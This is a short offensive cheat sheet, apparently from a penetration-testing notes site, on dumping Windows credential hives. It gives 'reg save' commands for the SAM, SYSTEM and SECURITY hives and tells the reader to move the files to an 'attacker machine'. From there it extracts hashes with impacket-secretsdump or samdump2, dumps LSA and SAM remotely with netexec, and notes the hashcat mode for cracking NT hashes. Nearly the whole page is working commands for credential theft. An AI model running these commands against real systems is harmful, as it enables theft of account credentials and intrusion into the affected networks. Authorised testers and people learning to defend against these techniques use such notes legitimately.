>Poor Sam. My condolences.

# Manual

```powershell
reg save hklm\sam sam
reg save hklm\system system
reg save hklm\security security
```

> Transfer the 3 files to attacker machine using any methods in `File Transfer/Windows Target`

Attacker machine

```sh
impacket-secretsdump -sam sam -system system -security security local
```

Or

```
samdump2 system sam
```

# Remote dumping

```sh
# LSA
netexec smb $target --local-auth -u 'user' -p 'password' --lsa
# SAM
netexec smb $target --local-auth -u 'user' -p 'password' --sam
```

if remote dumping isn't working, see [LocalAccountTokenFilterPolicy]({{< relref "10. Lateral Movement/Impacket-*exec#localaccounttokenfilterpolicy" >}})

> The hash format will be `(uid:rid:lmhash:nthash)`. Example `rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::`, `rocky` is `uid`, `1003` is `rid`,  `aad3b435b51404eeaad3b435b51404ee` is `lmhash`, `184ecdda8cf1dd238d438c4aea4d560d` is `nthash`
> `hashcat` mode for `nthash` is `1000`